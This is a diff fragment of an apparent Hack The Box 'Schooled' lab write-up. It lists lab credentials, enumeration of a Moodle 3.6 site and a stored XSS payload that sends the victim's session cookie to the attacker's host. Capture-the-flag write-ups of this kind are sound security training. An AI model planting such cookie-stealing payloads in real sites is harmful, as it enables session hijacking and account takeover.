@@ -7,7 +7,7 @@ moodle         |PlaybookMaster2020|MySQL    |
 jamie          |!QAZ2wsx          |System   |
 
 ### Web (80) 
-- hostname: schooled.htb
+- hostname: `schooled.htb`
 **Moodle**
 - subdomain: `moodle.schooled.htb`
 - version: 3.6
@@ -24,7 +24,7 @@ jamie          |!QAZ2wsx          |System   |
 2. The website metioned they using Moodle many times, so try to visit `moodle.schooled.htb` and get good luck.
 3. Register an user.
 4. `http://moodle.schooled.htb/moodle/admin/tool/dataprivacy/summary.php` has some system information, so I tried to view `http://moodle.schooled.htb/moodle/admin/tool/`, which showed a lot information, and got the version of moodle was about 3.6 in `upgrade.txt`.
-5. In the announcement of the Math course, the teacher metioned he would check all students' MoodleNet Profile, so I went check on the field an found it had XSS vulnertability.
+5. In the announcement of the Math course, the teacher mentioned he would *check all students' MoodleNet Profile*, so I went check on the field an found it had XSS vulnerability.
 - Payload: 
 ```
 <script>document.location='http://10.10.16.9:13338/?c='+document.cookie</script>
